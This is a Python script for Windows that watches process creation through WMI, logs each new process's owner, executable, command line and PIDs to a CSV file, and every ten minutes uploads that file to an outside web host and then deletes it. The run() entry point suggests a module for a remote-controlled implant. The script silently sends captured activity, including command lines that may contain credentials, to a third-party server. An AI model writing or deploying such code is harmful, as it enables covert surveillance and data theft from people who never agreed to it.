import win32con
import win32api
import win32security

import wmi
import sys
import os
import threading
import requests
import time



st_time = time.time()

def log_to_file(message):
    fd = open("process_monitor.csv" , "ab")
    fd.write("%s\r\n" % message)
    fd.close()
    return
	


def export():
    try:
      print "Exporting"
      url = "http://psyberlupus.000webhostapp.com/site.php/post"
      files = {'document': open('process_monitor.csv','rb')}
      r = requests.post(url, files=files)
      os.remove("process_monitor.csv")
    except:
        pass

def monitor():
     global st_time
     c = wmi.WMI()
# create our process monitor
     process_watcher = c.Win32_Process.watch_for("creation")
     print "fire!!"
     while True:
       try:
        print "Look for new process"
        new_process = process_watcher()
        proc_owner = new_process.GetOwner()
        proc_owner = "%s\\%s" % (proc_owner[0],proc_owner[2])
        create_date = new_process.CreationDate
        executable = new_process.ExecutablePath
        cmdline = new_process.CommandLine
        pid = new_process.ProcessId
        parent_pid = new_process.ParentProcessId
        priviledges = "N/A"
        process_log_message = "%s,%s,%s,%s,%s,%s,%s\r\n" % (create_date,proc_owner,executable,cmdline,pid,parent_pid, priviledges)
        print process_log_message
        log_to_file(process_log_message)
        if time.time() - st_time > 600:
            thread_e = threading.Thread(target=export)
            thread_e.start()
            st_time = time.time()
        # Send to remote
       except:
        print "Escprt"
        pass

def run(**args):
     global st_time
     st_time = time.time()
     log_to_file("Time , User , Executable , CommandLine , PID , Parent PID, Privileges")
     monitor()
     return True 
